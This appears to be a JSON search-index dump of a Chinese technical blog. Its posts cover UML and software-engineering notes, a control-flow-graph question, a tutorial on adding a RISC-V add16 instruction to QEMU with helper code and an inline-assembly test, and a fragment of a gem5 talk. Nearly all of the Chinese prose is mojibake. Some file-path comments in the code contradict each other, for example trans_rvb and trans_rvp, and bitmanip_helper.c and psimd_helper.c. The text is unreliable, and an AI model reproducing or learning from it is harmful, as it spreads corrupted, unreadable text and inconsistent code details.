åŸºæœ¬äº‹ä»¶æµå’Œå¤‡é€‰åˆ©ç”¨ä¸­æ‹¬å·[] å›´ç»•å­æ´»åŠ¨æˆ–è€…è¿›å…¥å¤‡é€‰äº‹ä»¶æµçš„æ¡ä»¶ï¼Œå¯ä»¥å¦ç”¨æ´»åŠ¨å›¾æè¿° æ•°æ®æµå›¾åŸºæœ¬ç¬¦å·å®ä½“ï¼Œå¤„ç†ï¼Œå­˜å‚¨ï¼Œæµ ç”»æ³•çœ‹è¯¾ä»¶ åŒ…å›¾å¤§åŒ… åµŒå¥— å°åŒ…ï¼Œå°åŒ… åµŒå¥— ç±» $$ \\oplus $$ : åµŒå¥—å…³ç³» è™šçº¿ï¼šå±‚é—´çš„ä½¿ç”¨(ä¾èµ–)å…³ç³» å®çº¿ï¼šåŒ…é—´çš„ä½¿ç”¨(ä¾èµ–)å…³ç³» ç©ºå¿ƒä¸‰è§’ï¼š ç»§æ‰¿ é¿å…å¾ªç¯ä¾èµ– ç±»å›¾é¢†åŸŸæ¨¡å‹å®ä½“ç±» &lt;&lt;entity&gt;&gt; ç±»å ï¼š æ„é€ æ€§ å˜é‡ï¼š å¯è§æ€§ (private , public ..) - (-,+,_,~) ä¾èµ–ï¼ˆè®¡ç®—ï¼‰å±æ€§ï¼Œ(/) åå­— ï¼š ç±»å‹ ï¼š UMLå®šä¹‰çš„ï¼Œint Stringâ€¦ ä¸‹åˆ’çº¿ï¼šè¡¨ç¤ºé™æ€ æ–¹æ³•ï¼š åŒä¸Š å‚æ•°ä¸‰ç§ç±»å‹ ï¼š in ï¼Œ out ,inout æ²¡æœ‰æ–¹æ³• å…³è”ç±»æè¿°ä¸¤ä¸ªå¯¹è±¡ä¹‹é—´çš„è”ç³» é¡ºåºå›¾è¡¨ç¤ºä¸€ä¸ªç”¨ä¾‹ï¼ŒåŒæ­¥è°ƒç”¨çš„æ–¹å¼ï¼ˆé˜»å¡ï¼‰ æ§åˆ¶ç„¦ç‚¹ ï¼š é•¿æ–¹å½¢ ç”Ÿå‘½çº¿: ç«–è™šçº¿ åŒæ­¥æ¶ˆæ¯ï¼šå®å¿ƒä¸‰è§’ç®­å¤´ ï¼ˆå·¦å³éƒ½å¯ä»¥ï¼‰ è¿”å›æ¶ˆæ¯ï¼š è™šçº¿å·¦ç®­å¤´ å¼‚æ­¥æ¶ˆæ¯ï¼š åˆ›å»ºå¯¹è±¡ ï¼Œ è™šçº¿å³ç®­å¤´ ä¸ä¼šï¼Œæ‰¾æˆ‘ï¼Œç»™å›¾ ç»“æ„ï¼š æ–¹æ‹¬å· condition å¯é€‰ ï¼š opt - æœ‰æ¡ä»¶æ‰§è¡Œçš„åŠ¨ä½œï¼Œä¸æ»¡è¶³æ¡ä»¶å°±ä¸æ‰§è¡Œ å¤šåˆ†æ”¯ alt - ä¸åŒçš„æ¡ä»¶æ‰§è¡Œä¸åŒçš„åŒå å¾ªç¯ loop(start,end,condition) é€šä¿¡å›¾å¯åµŒå¥—ï¼Œæˆ–ç”¨ç¼–å·.ç¼–å·è¡¨ç¤ºåµŒå¥—çº§åˆ« å…¶ä»–ä¸é¡ºåºå›¾ç±»ä¼¼ çŠ¶æ€å›¾å”¯ä¸€çš„å¼€å§‹çŠ¶æ€ï¼Œå¯ä»¥æœ‰å¤šä¸ªç»“æŸçŠ¶æ€ï¼Œé’ˆå¯¹ç¡®å®šæ€§è¡Œä¸º è½¬å°æ¡†ä¸­çš„ä¸‰ä¸ªçŠ¶æ€ ï¼š Entry - Do - Exit çŠ¶æ€è½¬æ¢ - è¿‡æ¸¡äº‹ä»¶+[æ¡ä»¶]+åŠ¨ä½œ åœ¨äº‹ä»¶è¢«è§¦å‘å¹¶ä¸”æ»¡è¶³æŸä¸ªç‰¹å®šæ¡ä»¶çš„æƒ…å†µä¸‹æ‰ä¼šè¿›è¡Œ åŠ¨ä½œï¼šentry æ‰§è¡Œå‰ï¼Œæœªè¿›å…¥çŠ¶æ€æ—¶åšçš„åŠ¨ä½œ å±‚æ¬¡åŒ–ç»„ç»‡ ï¼š æ¡†èµ·æ¥ åˆ†è§£ ï¼š åˆ†è§£ä¸ºäº’ä¸ä¾èµ–çš„å­çŠ¶æ€ - å­çŠ¶æ€ç¦»å¼€ å¹¶è¡Œï¼š æœ‰ä¸¤ä¸ªè¾“å…¥ï¼Œåˆ™éƒ½å®Œæˆæ‰ä¼šè¢«è§¦å‘ ä½“ç³»ç»“æ„é£æ ¼æ¨¡å—ä»ä½åˆ°é«˜æ’åº å†…èšç¨‹åº¦ï¼šå†…éƒ¨å„ä¸ªå…ƒç´ å½¼æ­¤ç»“åˆçš„ç´§å¯†ç¨‹åº¦ - è¶Šé«˜ï¼Œæ¨¡å—ç‹¬ç«‹æ€§è¶Šå¼º å¶ç„¶å†…èšã€é€»è¾‘å†…èšã€æ—¶é—´å†…èšã€é€šä¿¡å†…èšã€é¡ºåºå†…èšåŠåŠŸèƒ½å†…èšã€‚ è€¦åˆç¨‹åº¦ï¼šæ¨¡å—ä¹‹é—´äº’ç›¸è¿æ¥çš„ç´§å¯†ç¨‹åº¦ - è¶Šä½ï¼Œæ¨¡å—ç‹¬ç«‹æ€§è¶Šå¼º éç›´æ¥ &lt; æ•°æ®ï¼œæ ‡è®°ï¼œæ§åˆ¶&lt; å¤–éƒ¨ï¼œå…¬å…±ï¼œå†…å®¹ 4+1 è§†å›¾æ¨¡å‹ç”¨ä¾‹åœ¨ä¸­é—´ï¼Œå››å‘¨æ˜¯é€»è¾‘è§†å›¾ï¼ˆåŠŸèƒ½éœ€æ±‚ï¼‰ï¼Œå¼€å‘è¯•å›¾ï¼ˆè½¯ä»¶æ¨¡å—ï¼‰ï¼Œè¿›ç¨‹è§†å›¾ï¼ˆå¹¶å‘ï¼‰ï¼Œç‰©ç†è§†å›¾ï¼ˆç¡¬ä»¶ï¼‰","link":"","tags":[{"name":"è½¯ä»¶å·¥ç¨‹","slug":"è½¯ä»¶å·¥ç¨‹","permalink":"https://dingiso.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"}]},{"title":"Question","date":"2021-03-07T12:07:05.000Z","path":"2021/03/07/Question/","text":"æœ¬æ–‡ä¸»è¦æ˜¯ç”¨äºè¯¢é—®è½¯ä»¶å·¥ç¨‹é—®é¢˜ é—®é¢˜è€å¸ˆæˆ‘æƒ³é—®ä¸€ä¸‹è¯¾åé¢˜çš„ 11.2 è€å¸ˆæ‚¨ä¸Šè¯¾ç»™çš„ç­”æ¡ˆå¦‚ä¸‹ æˆ‘å¯¹äº 4 ç»“ç‚¹ä¸ 9 ç»“ç‚¹æœ‰ç‚¹é—®é¢˜ï¼Œ4 ç»“ç‚¹æˆ‘è®¤ä¸ºåº”è¯¥æ˜¯ä¸¤ä¸ªç»“ç‚¹ï¼Œ9ç»“ç‚¹åœ¨ä»£ç ä¸Šæ²¡æœ‰å®é™…çš„ä»£ç è¡Œå¯¹åº” æˆ‘åšçš„ç»“æœè¯¦ç»†çš„æ˜¯ä¸‹å›¾ å›ç­”æ§åˆ¶æµå›¾åº”è¯¥å°½é‡ç®€æ´ï¼Œä¾¿äºè®¡ç®—ç¯å½¢å¤æ‚åº¦ï¼Œé¡ºåºç»“æ„èƒ½åˆå¹¶çš„åº”è¯¥å°½é‡åˆå¹¶ï¼ŒåŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯è¿™æ ·çš„åˆå¹¶å¹¶ä¸ä¼šæ”¹å˜ç¯å½¢å¤æ‚åº¦ 4 ç»“ç‚¹æ˜¯ åˆå¹¶åçš„ç»“æœ - ç»“ç‚¹æ•° - 1 ï¼Œè¾¹ - 1 ä¸å½±å“ç¯å½¢å¤æ‚åº¦ 9 ç»“ç‚¹æ˜¯ ä¸ºäº†ç”»å›¾æ›´æ¸…æ™° - ç»“ç‚¹æ•° + 1 ï¼Œè¾¹ + 1 ä¸å½±å“ç¯å½¢å¤æ‚åº¦ æ›´æ”¹çš„å›¾ä¾‹å¦‚ä¸‹","link":"","tags":[{"name":"Question","slug":"Question","permalink":"https://dingiso.github.io/tags/Question/"}]},{"title":"åœ¨QEMUä¸­å®šåˆ¶RISCVæŒ‡ä»¤å¹¶æµ‹è¯•","date":"2021-02-13T04:05:34.000Z","path":"2021/02/13/åœ¨QEMUä¸­å®šåˆ¶RISCVæŒ‡ä»¤å¹¶æµ‹è¯•/","text":"æœ¬æ–‡ä¸»è¦æ˜¯ä»‹ç» é€šè¿‡QEMUä¸­æä¾›çš„Decode Tree çš„æ–¹æ³•å®šä¹‰æŒ‡ä»¤ç¼–ç  å®šä¹‰æŒ‡ä»¤çš„è½¬ä¹‰å’ŒæŒ‡ä»¤çš„åŸºç¡€é€»è¾‘ åˆ©ç”¨äºŒè¿›åˆ¶çš„æ–¹å¼å®šä¹‰æµ‹è¯•ç¨‹åºå¹¶æµ‹è¯• ä½¿ç”¨ Pæ‰©å±•(Packed SIMD) ä½œä¸ºç¤ºä¾‹ QEMU ä¸‹è½½ä¸ºäº†æ›´æ”¹QEMUçš„æºç ï¼Œæˆ‘ä»¬éœ€è¦æ­£ç¡®ä¸‹è½½æºä»£ç å¹¶è‡ªè¡Œè¿›è¡Œç¼–è¯‘ï¼ŒQEMUæä¾›äº†ä¸¤ç§æ–¹å¼æ–¹ä¾¿æˆ‘ä»¬ä¸‹è½½ã€‚ é€šè¿‡ git çš„æ–¹å¼ä¸‹è½½ QEMU çš„æœ€æ–°æºç  - è¯¥æ–¹å¼å¯èƒ½éœ€è¦ä¸€ä¸ªç¨³å®šçš„ â€œç§‘å­¦çš„â€ ç½‘ç»œ 1234git clone https://gitlab.com/qemu-project/qemu.gitcd qemugit submodule initgit submodule update --recursive åŒæ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€‰æ‹©ä¸‹è½½å®˜ç½‘æ‰“åŒ…å¥½çš„æœ€æ–°ç¨³å®šç‰ˆçš„QEMUæºç ï¼Œè¿™èƒ½è®©ä½ æ›´ç¨³å®šï¼Œå¿«é€Ÿçš„å¾—åˆ°ä»£ç ï¼Œä½†å¯èƒ½ä¸æ˜¯ git åŒæ­¥çš„æœ€æ–°ç‰ˆæœ¬ - QEMU-5.2.0 123wget https://download.qemu.org/qemu-5.2.0.tar.xztar xvJf qemu-5.2.0.tar.xzcd qemu-5.2.0 é€šè¿‡ä»¥ä¸Šæ–¹å¼ä¸‹è½½è¿‡åï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹è¿›è¡ŒæŒ‡ä»¤çš„æ·»åŠ äº† æŒ‡ä»¤ç¼–ç  - Decode Treeä¸ºäº†æ–¹ä¾¿å¼€å‘è€…å’Œç¼–è¯‘æ£€æŸ¥ï¼ŒQEMU ä¸­çš„æŒ‡ä»¤çš„äºŒè¿›åˆ¶æŒ‡ä»¤ç¼–ç éƒ½æ˜¯ä»¥Decode Tree æ–¹å¼è¿›è¡Œå®šä¹‰çš„ï¼ŒQEMUçš„å†…éƒ¨ç¨‹åºåœ¨ç¼–è¯‘æ—¶ä¼šå°†å…¶è‡ªåŠ¨è§£æä¸º c è¯­è¨€ã€‚ ç‰¹åˆ«åœ°ï¼Œåƒ RISC-V è¿™ç§æ‹¥æœ‰å›ºå®šæŒ‡ä»¤æ ¼å¼çš„ ISA ç‰¹åˆ«å¥‘åˆ Decode Treeã€‚å› ä¸ºå„ä¸ªæŒ‡ä»¤æ®µéƒ½åœ¨å›ºå®šçš„ä½ç½®ã€‚å„ä¸ªæ®µçš„é‡å¤æ€§è¦é«˜å¾ˆå¤šï¼Œè¶³ä»¥èŠ‚çœå¾ˆå¤šä»£ç ç©ºé—´ ä¸‹é¢æˆ‘ä»¬å·²ä¸€ç§æœ€å¸¸ç”¨çš„ä¸‰å‚æ•°æŒ‡ä»¤çš„Pæ‰©å±•add16ä½œä¸ºä¾‹å­ï¼š 1234#ï¼target/riscv/insn*.decode# 31:25 24:20 19:15 14:12 11:7 6:0add16 0100000 ..... ..... 000 ..... 1110111 @r# funct7 Rs2 Rs1 funct3 Rd opcode 12345678# å…¶ä¸­ç”¨åˆ°çš„å„ä¸ªå®šä¹‰å¦‚ä¸‹# Formats 32:@r ....... ..... ..... ... ..... ....... &amp;r %rs2 %rs1 %rd# Fields:%rs2 20:5%rs1 15:5%rd 7:5 ä¸€ä¸ªæŒ‡ä»¤çš„å®šä¹‰æœ‰ä»¥ä¸‹å‡ ä¸ªè¿‡ç¨‹ æ‰¾åˆ°å®˜æ–¹æ–‡ä»¶å¯¹äºæŒ‡ä»¤ç¼–ç çš„å®šä¹‰ï¼Œå°†æŒ‡ä»¤åç§°add16å’ŒäºŒè¿›åˆ¶ç¼–ç 0100000 ..... ..... 000 ..... 1110111å¡«å…¥ é€šè¿‡æŒ‡ä»¤å¯¹äºå‚æ•°çš„å®šä¹‰ï¼Œé€‰å–åˆé€‚çš„Formatï¼Œä¾‹å¦‚ @r ï¼Œå°±é¡ºåºåŒ…å«äº†ä¸¤ä¸ªè¾“å…¥å¯„å­˜å™¨rs1 &amp; rs2 å’Œè¾“å‡ºå¯„å­˜å™¨rd å¦‚æœæ²¡æœ‰ï¼Œå°±éœ€è¦è‡ªå·±å®šä¹‰ æœ‰å…³decoder tree çš„å…·ä½“å†…å®¹ï¼Œæ¥ä¸‹æ¥çš„åšå®¢å¯èƒ½ä¼šè¿›è¡Œé˜è¿°ï¼Œ ä½†æ˜¯æœ‰çš„ blogs å·²ç»æœ‰äº†è¯¦ç»†çš„é˜è¿°ï¼Œqemu å®˜æ–¹ä¹Ÿæœ‰ï¼Œä¸‹é¢ç»™å‡ºé“¾æ¥ï¼Œå¤§å®¶å¯ä»¥å‚é˜… QEMUå®˜æ–¹ï¼š Decode Treeçš„å®šä¹‰ å…¶ä»–åšå®¢çš„å®šä¹‰ï¼šPart-1ï¼ŒPart-2 æŒ‡ä»¤è½¬è¯‘ - transQEMUåœ¨æ‰§è¡Œæ—¶ï¼Œä¼šå°† target instructions(e.g. RISC-V instructions) è½¬è¯‘æˆ TCG opsï¼Œè€ŒTCG opsåˆ™ä¼šå†è½¬è¯‘ä¸ºhost instructions(e.g. x86 instruction)ã€‚è€Œtrans_add16() å®é™…æ‰§è¡Œäº† add16 æŒ‡ä»¤å¯¹åº”çš„ TCG ops 12345#ï¼ QEMU dynamic instructions translation+---------------------+ +---------+ +-------------------+| Target Instructions | ---&gt; | TCG ops | ---&gt; | Host instructions |+---------------------+ +---------+ +-------------------+ (e.g. RISC-V) (e.g. x86) å…³äº TCG çš„è¯´æ˜ï¼Œå¯ä»¥å‚è€ƒ QEMU çš„ documentations Translator Internalsï¼ŒTCG Readme ä¸ºäº†æ–¹ä¾¿å®šä¹‰å’ŒåŒºåˆ†ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶./target/riscv/insn_trans/trans_rvp.inc.cæ¥å®šä¹‰P ExtensionæŒ‡ä»¤çš„trans_xx()å‡½æ•° 123456789101112131415161718192021222324#ï¼ ./target/riscv/insn_trans/trans_rvb.c.inc/* * RISC-V translation routines for the RVP Standard Extension. */static bool trans_add16(DisasContext *ctx, arg_pcnt *a) &#123; if (a-&gt;rd != 0) &#123; TCGv t0 = tcg_temp_new(); TCGv t1 = tcg_temp_new(); TCGv rt = tcg_temp_new(); gen_get_gpr(t0, a-&gt;rs1); gen_get_gpr(t1, a-&gt;rs2); gen_helper_add16(rt, t0, t1); gen_set_gpr(a-&gt;rd, rt); tcg_temp_free(rt); tcg_temp_free(t0); tcg_temp_free(t1); &#125; return true;&#125; ç”±äºå¯¹x0(zero register)çš„å†™å…¥éƒ½ä¼šè¢«å¿½ç•¥ï¼Œå› æ­¤é¦–å…ˆåˆ¤æ–­rdæ˜¯å¦ä¸º0ï¼Œè‹¥ä¸º0åˆ™ä¸åšä»»ä½•äº‹æƒ… æ¥ç€å£°æ˜ä¸¤ä¸ªTCG variableï¼št0å’Œt1ï¼Œåˆ©ç”¨gen_get_gpr()å°†rs1,rs2å¯„å­˜å™¨çš„å€¼å­˜å…¥å˜é‡ å£°æ˜ä¸€ä¸ªæ–°å˜é‡ rt åˆ©ç”¨ gen_set_gpr() å°† ç»“æœå­˜å…¥ rd å¯„å­˜å™¨ä¸­ åˆ©ç”¨æ–°å£°æ˜çš„å˜é‡è°ƒç”¨gen_helper_add16()å‡½æ•°è½¬å‘helper functionï¼Œè¯¥å‡½æ•°è®¡ç®—å®Œæˆåï¼Œä¼šå°†ç»“æœä¿å­˜åœ¨rd(i.e. cpu_gpr[a-&gt;rd])å¯„å­˜å™¨ä¸­ã€‚ P.S. å…¶å®è¿™é‡Œå¯ä»¥ç®€å•çš„ç›´æ¥å°†cpu_gpr[a-&gt;rs1]ä¼ å…¥ï¼Œçœç•¥TCG variable: t0,t1 çš„å£°æ˜ï¼š æ³¨æ„ ï¼š è¯¥æ–¹æ³•ä¸æ¨èä½¿ç”¨ï¼Œæˆ‘ä»¬åœ¨æµ‹è¯•è¿‡ç¨‹å‘ç°è¿™æ ·å¯èƒ½å¯¼è‡´é”™è¯¯çš„äº§ç”Ÿ 1234567891011#! ./target/riscv/insn_trans/trans_rvp.c.inc/* * RISC-V translation routines for the RVB Standard Extension. */static bool trans_add16(DisasContext *ctx, arg_pcnt *a) &#123; if (a-&gt;rd != 0) &#123; gen_helper_add16(cpu_gpr[a-&gt;rd], cpu_gpr[a-&gt;rs1], cpu_gpr[a-&gt;rs2]); &#125; return true;&#125; æŒ‡ä»¤çš„é€»è¾‘ - helper function123#define DEF_HELPER_2(name, ret, t1, t2) \\ DEF_HELPER_FLAGS_2(name, 0, ret, t1, t2)//DEF_HELPER_FLAGS_2(name,flag,ret,t1,t2) ä¸ºäº†æ–¹ä¾¿QEMUå¯¹äºhelper functionçš„è°ƒç”¨å’Œå®šä¹‰ï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰ä¸€ä¸ªå‡½æ•°DEF_HELPER_x = DEF_HELPER_FLAGS_x å¯¹QEMUå£°æ˜å‡½æ•°çš„åç§°å’Œå‚æ•°, xä»£è¡¨è¯¥æŒ‡ä»¤éœ€è¦çš„å‚æ•°-(è‡ªå˜é‡ï¼‰ï¼Œä¸å¸¦ _FLAGS çš„å‡½æ•°ä¼šåˆ©ç”¨å‘½ä»¤è‡ªåŠ¨å°† FLAGSå‚æ•°ç½®ä¸º0ã€‚ name ï¼šæŒ‡ä»¤çš„åç§°ï¼Œè¿æ¥æˆ HELPER(name) / helper_name çš„å½¢å¼ä½œä¸º helper function flag : å‡½æ•°æƒé™ä½ï¼ŒTCGè°ƒç”¨çš„æƒé™ï¼Œå…¨å±€ä¸è¯»/å†™ï¼Œè¿”å›å€¼æ— ç”¨ï¼Œæ— è¿”å›å€¼ã€‚tcg.h ret : helper functionè¿”å›å€¼ t1- tn ï¼šhelper functionçš„å‚æ•° ret å’Œ t1-tn çš„ç±»å‹å¯ä»¥æ˜¯ï¼Œ ç±»å‹ æ„ä¹‰ tl target_ulong - QEMUä¸­ä¿å­˜å¯„å­˜å™¨å€¼å¾—åŸºæœ¬å•ä½ env environment - CPUXXSTATE ä¿å­˜CPUçŠ¶æ€å¯„å­˜å™¨çš„å€¼ i64 integer-64 - 64ä½æ•´å‹å¯ç”¨äºæµ®ç‚¹æ•°æŒ‡ä»¤ add16çš„ helper function å®šä¹‰å¦‚ä¸‹: 1234#! ./target/riscv/helper.h/* Packed-SIMD Extension */DEF_HELPER_2(add16, tl, tl, tl)DEF_HELPER_FLAGS_3(add16, 0, tl, tl, tl) ä¸¤ç§å®šä¹‰æ„ä¹‰ç›¸åŒ 1234567891011121314151617181920212223242526272829#! ./target/riscv/bitmanip_helper.c/* * RISC-V P Extension Helpers for QEMU. */#include &quot;qemu/osdep.h&quot;#include &quot;cpu.h&quot;#include &quot;exec/exec-all.h&quot;#include &quot;exec/helper-proto.h&quot;#define u16p uint16_t *#if defined(TARGET_RISCV32)const uint32_t LC_16BIT = 2;#elseconst uint32_t LC_16BIT = 4;#endif// target_ulong HELPER(add16)(target_ulong rs1, target_ulong rs2) target_ulong helper_add16 (target_ulong rs1, target_ulong rs2) &#123; target_ulong rd = 0; u16p rs1_p = (u16p)&amp;rs1; u16p rs2_p = (u16p)&amp;rs2; u16p rd_p = (u16p)&amp;rd; for (unsigned i = 0; i &lt; LC_16BIT; i++) rd_p[i] = rs1_p[i] + rs2_p[i]; return rd;&#125; è¯¥å‡½æ•°å°±æ˜¯add16çš„å®é™…é€»è¾‘å‡½æ•°ï¼Œhelper function æ¥å—ä¸¤ä¸ª target_ulong ç±»å‹çš„ rs1&amp;rs2, å¹¶å°†ç»“æœè¿”å›ï¼Œå­˜å‚¨åœ¨ rd å¯„å­˜å™¨ add16 æŒ‡ä»¤çš„å†…å®¹ï¼Œæ˜¯å°†å¯„å­˜å™¨åˆ†ä¸ºå¤šä¸ª16ä½æ•°å¹¶åˆ†åˆ«è®¡ç®—ï¼Œå› æ­¤æˆ‘ä»¬å°†rs1/2 å˜ä¸º16ä½çš„æ•°ç»„(æŒ‡é’ˆ)å¹¶åˆ†åˆ«è¿›è¡ŒåŠ æ³•è¿ç®—ï¼Œå¾—åˆ°ç»“æœç„¶åè¿”å›ã€‚ è¡¥å……ä¸ºäº†ä½¿æŒ‡ä»¤æˆåŠŸæ‰§è¡Œï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¡«å†™ä»¥ä¸‹ä»£ç  12345#! ./target/riscv/meson.buildriscv_ss.add(files( &#x27;psimd_helper.c&#x27;,)) 1234#! ./target/riscv/translate.c/* Include insn module translation function */#include &quot;insn_trans/trans_rvp.c.inc&quot; æŒ‡ä»¤çš„æµ‹è¯•åœ¨æˆ‘ä»¬äº†è§£äº†æŒ‡ä»¤çš„æ·»åŠ æµç¨‹åï¼Œæˆ‘ä»¬è¦å¯¹æ·»åŠ åçš„æŒ‡ä»¤è¿›è¡Œæµ‹è¯•ä»¥ç¡®ä¿æŒ‡ä»¤çš„æ­£ç¡®æ€§ã€‚ ä¸ºäº†æˆåŠŸç¼–è¯‘ï¼Œä½ éœ€è¦äº‹å…ˆå®‰è£…riscv64-unknown-elf-gccæ¥ç¼–è¯‘æµ‹è¯•ç¨‹åºï¼Œä½ å¯ä»¥é€šè¿‡ riscv-gnu-toolchain è¿›è¡Œç¼–è¯‘å®‰è£… ä¸‹é¢æˆ‘å°†ä»‹ç»ä¸€ä¸‹QEMUçš„ç¼–è¯‘è¿‡ç¨‹ï¼Œé‰´äºæˆ‘ä»¬åªéœ€è¦QEMUçš„ç”¨æˆ·æ€æµ‹è¯•ç¨‹åºï¼Œæˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åœ¨ä½ ä¿å­˜qemuçš„æ–‡ä»¶å¤¹ä¸‹ï¼š 1234mkdir buildcd build../configure --target-list=riscv64-linux-usermake build æ–‡ä»¶å¤¹ç”¨äºä¿å­˜ä½ çš„ç¼–è¯‘ç»“æœï¼Œä½ ä¹Ÿå¯ä»¥è‡ªç”±é€‰æ‹©æƒ³è¦ä¿å­˜çš„æ–‡ä»¶å¤¹ã€‚ æ¥ç€æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª p_test æ–‡ä»¶å¤¹ä¿å­˜æµ‹è¯•ç¨‹åºå¹¶è¿›è¡Œæµ‹è¯•, å› ä¸ºåŸæœ‰çš„å·¥å…·é“¾å¹¶ä¸å«æœ‰æ–°æ·»åŠ çš„æŒ‡ä»¤ï¼Œæ²¡åŠæ³•ç¼–è¯‘æˆåˆé€‚çš„äºŒè¿›åˆ¶ç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å†…è”æ±‡ç¼–ä¸ºå…¶æä¾›äºŒè¿›åˆ¶ç¼–ç ï¼Œçœå»æ›´æ”¹å·¥å…·é“¾çš„éº»çƒ¦ã€‚ 123456789101112131415161718192021#! ./build/p_test/add16.c#include&lt;stdio.h&gt;__attribute__((noinline))int mac_asm(int a,int b,int c) &#123; asm __volatile__ (&quot;.word 0x40c58577\\n&quot;); asm __volatile__ (&quot;mv %0,a0\\n&quot; : &quot;=r&quot;(a) : :); printf(&quot;a=%d\\n&quot;,a); return a;&#125;int main()&#123; int a=5,b=0xFFFEFFFF,c=0xFFFEFFFF; printf(&quot;add16:=0x%x\\n add:=0x%x\\n&quot;,mac_asm(a,b,c),b+c); return 0;&#125; RISC-V ä¼šå°†å‡½æ•°çš„å‚æ•°æ”¾å…¥ a0-a7 å¯„å­˜å™¨ä¸­ï¼Œå¹¶å°† a0 å¯„å­˜å™¨ä¸­çš„å€¼è¿”å› a0-a7 å¯¹åº” x10-x17 å’ŒäºŒè¿›åˆ¶ç¼–ç  10-17 ï¼Œ å› æ­¤æœ€åçš„æŒ‡ä»¤ç¼–ç å¦‚ä¸‹ 12345678910111213# Encoding used for &quot;add16 a0, a1, a2&quot;0x40c58577 [base 16]==# Group by related bit chunks:0100000 01100 01011 000 01010 1110111 [base 2]^ ^ ^ ^ ^ ^| | | | | || | | | | opcode (6..2=0x1D 1..0=3)| | | | dest (10 : a0)| | | funct3 (14..12=0)| | src1 (11 : a1)| src2 (12 : a2)funct7 (31..25=0x40) ä¸ºäº†é˜²æ­¢åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ï¼Œç¼–è¯‘å™¨ä¼šå¯¹å¯„å­˜å™¨è¿›è¡Œä¼˜åŒ–ï¼Œå°†è¿”å›å€¼å­˜å…¥å…¶ä»–å¯„å­˜å™¨ï¼Œæˆ‘ä»¬ä½¿ç”¨ mv æŒ‡ä»¤å¼ºåˆ¶å°†å˜é‡ a çš„å€¼èµ‹ç»™ a0 å¯„å­˜å™¨,è¿™æ ·å°±èƒ½æˆåŠŸå°†å€¼è¿”å›ã€‚ 12riscv64-unknown-elf-gcc -o x x.c../qemu-riscv64 xx æˆ‘ä»¬åˆ©ç”¨ä»¥ä¸ŠæŒ‡ä»¤æ‰§è¡Œï¼Œè¿”å›æ­£ç¡®çš„ç»“æœ 12add16:=0xfffcfffe add:=0xfffdfffe add16 ç”±äºæ¯16ä½è¿›è¡Œè®¡ç®—ï¼Œæ‰€ä»¥æ— å16ä½çš„è¿›ä½ï¼Œä¸­é—´ä½æ˜¯cï¼Œè€Œaddç”±äºæœ‰è¿›ä½ï¼Œæ‰€ä»¥æ˜¯d åœ¨QEMUä¸­å®šåˆ¶æŒ‡ä»¤çš„æµç¨‹å¤§è‡´å¦‚åŒæœ¬æ–‡çš„ä»‹ç»ï¼Œä½†æ˜¯ç”±äº add16 ä»…æ¶‰åŠæ•°å€¼çš„è®¡ç®—ï¼Œè€Œæ²¡æœ‰åƒ csr ç›¸å…³æŒ‡ä»¤æ¶‰åŠ CPURISCVState çš„æ›´æ–°ï¼Œä»¥åŠåƒjalæŒ‡ä»¤æ¶‰åŠDisasContextçš„åˆ¤æ–­ï¼Œå› æ­¤ç›¸å¯¹ç®€å•ï¼Œå¯¹äºå…¶ä»–æŒ‡ä»¤ï¼Œéœ€è¦åœ¨å¥½å¥½çš„ç ”ç©¶ä»¥ä¸‹ Refrences: QEMU-ä½¿ç”¨ Decodetreeæ–°å¢ RISC-V æŒ‡ä»¤ RISC-V: custom instruction and its simulation riscv-p-spec æ„Ÿè°¢åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­ï¼Œè€å¸ˆä»¬çš„æŒ‡å¯¼ï¼Œéå¸¸æ„Ÿè°¢ï¼ï¼","link":"","tags":[{"name":"QEMU","slug":"QEMU","permalink":"https://dingiso.github.io/tags/QEMU/"},{"name":"RISC-V","slug":"RISC-V","permalink":"https://dingiso.github.io/tags/RISC-V/"},{"name":"sim","slug":"sim","permalink":"https://dingiso.github.io/tags/sim/"}]},{"title":"Up to Date","date":"2021-02-01T08:06:43.407Z","path":"2021/02/01/hello-world/","text":"Welcome to my blog !åœ¨è¿™é‡Œæˆ‘å°†åˆ†äº«ä¸€äº›æŠ€æœ¯ç»†èŠ‚å’Œç›¸å…³è¿‡ç¨‹ï¼Œä¸æ–­æ›´æ–°ä¸­ æ¬¢è¿æ¥æˆ‘çš„åšå®¢ - å»ºè®¾ç¨‹åº¦ 10/100","link":"","tags":[]},{"title":"Gem5 æ¼”è®²ç¨¿","date":"2021-01-13T00:05:34.000Z","path":"2021/01/13/Gem5 æ¼”è®²ç¨¿/","text":"æœ¬æ–‡æ˜¯ gem5 è§†é¢‘æ­é…çš„æ¼”è®²ç¨¿çš„éƒ¨åˆ†å†…å®¹è§†é¢‘åœ°å€ slidesåœ°å€ Gem5 æ¼”è®²ç¨¿Atomic è®¡æ—¶-è®¡æ—¶è®¿é—®æ˜¯æœ€è¯¦ç»†çš„è®¿é—®ã€‚å®ƒä»¬åæ˜ äº†æˆ‘ä»¬ä¸ºå®ç°å®é™…æ—¶é—´æ‰€åšçš„æœ€å¤§åŠªåŠ›ï¼Œå¹¶åŒ…æ‹¬æ’é˜Ÿå»¶è¿Ÿå’Œèµ„æºäº‰ç”¨çš„å»ºæ¨¡ã€‚ä¸€æ—¦åœ¨å°†æ¥çš„æŸä¸ªæ—¶é—´ç‚¹æˆåŠŸå‘é€äº†è®¡æ—¶è¯·æ±‚ï¼Œåˆ™å‘é€è¯·æ±‚çš„è®¾å¤‡å°†æ— æ³•è·å¾—å“åº”ï¼Œæˆ–è€…å¦‚æœæ— æ³•å®Œæˆè¯·æ±‚ï¼Œåˆ™å°†è·å¾—NACKï¼ˆä»¥ä¸‹æ›´å¤šå†…å®¹ï¼‰ã€‚å®šæ—¶å’ŒåŸå­è®¿é—®ä¸èƒ½åœ¨å†…å­˜ç³»ç»Ÿä¸­å…±å­˜ã€‚ 